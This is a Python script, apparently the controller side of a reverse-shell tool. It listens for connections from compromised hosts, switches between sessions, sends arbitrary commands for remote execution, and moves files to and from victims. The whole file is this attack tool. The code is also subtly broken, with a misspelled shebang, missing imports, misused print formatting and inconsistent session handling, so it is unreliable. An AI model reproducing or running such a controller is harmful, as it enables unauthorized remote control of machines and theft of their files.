#!/usr/bin/enbv python
import socket
import json
import base64

class Listener:
    """
    Multi-threaded controller.
    Listens for incoming connections on a given port,
    allows controller to issue commands to est. reverse shell.
    """
    def __init__(self, controller_ip, port):
        # change to AF_INET6 for public
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) # allow reuse to est new connection if dropped
        listener.bind((controller_ip, port))
        listener.listen(0)
        print("[+] Waiting for incoming connections...")
        threading.Thread(target=self.run).start()
        self.connections = []
        self.connection = None
        while True:
            connection, address = listener.accept()
            self.connections.append(connection)
            print("\n[+] Received connection from {i}.").format(i=str(address))
        
    def serialize(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data)
    
    def deserialize(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError: # more data
                continue

    def read_file(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read())

    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content)) # encapsulate all unknown chars
            return "[+] Successfully downloaded file {i} from host.".format(i=path)

    def remote_execution(self, command):
        self.serialize(command)
        if (command[0] == "exit"):
            self.connection.close()
            exit()
        return self.deserialize()
    
    def enum_sessions(self):
        connection_number = 0
        print("Session #\t\t\tAddress")
        for connection in self.connections:
            print(str(connection_number) + "\t\t\t" + str(connection[1]))
            connection_number = connection_number + 1

    def select_session(self, session_number):
        session_number = int(session_number)
        print("[+] Switching to " + self.connections[session_number][1][0])
        self.connection = self.connections[session_number][0]
    
    def terminate_all_quietly(self):
        for connection in self.connections:
            connection[0].close()
        os._exit(1)

    def run(self):
        while True:
            command = raw_input(">> ")
            command = command.split(" ") # convert to list
            try:
                if (command[0] == ""):
                    continue
                elif (command[0] == "exit"):
                    self.terminate_all_quietly()
                elif (command[0] == "sessions"):
                    self.enum_sessions()
                    continue
                elif (command[0] == "goto"):
                    self.select_session(command[1])
                    continue
                if (command[0] == "upload"): # upload TO host
                    file_content = self.read_file(command[1])
                    command.append(file_content)
                res = self.remote_execution(command)
                if (command[0] == "download" and "[-] An error " not in res): # download FROM host
                    res = self.write_file(command[1], res)
                elif (command[0] == "exitlist"):
                    self.connection.close()
                    exit()
            except Exception:
                res = "[-] An error occurred during command execution."

            print(res)

knex = Listener(CONTROLLER_IP,PORT)
knex.run()

""" 
full file path upload = command_result = self.write_file(command[1].split("/")[-1], command[2])
elif command[0] == "cd" and len(command) > 2:
    command[1] = " ".join(command[1:])

elif command[0] == "cd" and len(command) > 1:
    command_result = self.change_working_directory_to(command[1])
"""